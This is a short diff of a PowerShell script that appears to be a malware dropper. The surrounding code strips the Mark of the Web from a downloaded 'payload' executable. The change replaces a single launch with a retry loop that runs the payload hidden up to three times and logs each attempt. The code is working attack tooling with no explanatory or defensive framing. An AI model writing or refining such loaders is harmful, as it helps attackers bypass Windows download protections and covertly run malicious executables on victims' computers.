@@ -175,20 +175,29 @@ try {
         Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
     }
 
-    # Execute the .exe silently
-    try {
-        Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
-        Add-Content -Path $logPath -Value "Payload executed successfully using Start-Process."
-    } catch {
-        Add-Content -Path $logPath -Value "Start-Process execution failed: $_"
-        # Fallback: Try direct invocation
+    # Execute the .exe silently with up to 3 attempts
+    $maxAttempts = 3
+    $retryDelay = 5 # Seconds between attempts
+    $success = $false
+
+    for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
         try {
-            & $payloadPath
-            Add-Content -Path $logPath -Value "Payload executed successfully using direct invocation."
+            Add-Content -Path $logPath -Value "Attempting to execute payload (Attempt $attempt of $maxAttempts)..."
+            Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
+            Add-Content -Path $logPath -Value "Payload executed successfully on attempt $attempt."
+            $success = $true
+            break
         } catch {
-            Add-Content -Path $logPath -Value "Direct invocation failed: $_"
-            throw "Failed to execute payload using all methods."
+            Add-Content -Path $logPath -Value "Execution failed on attempt $attempt: $_"
+            if ($attempt -lt $maxAttempts) {
+                Add-Content -Path $logPath -Value "Waiting $retryDelay seconds before retrying..."
+                Start-Sleep -Seconds $retryDelay
+            }
         }
+    }
+
+    if (-not $success) {
+        throw "Failed to execute payload after $maxAttempts attempts."
     }
 
 } catch {
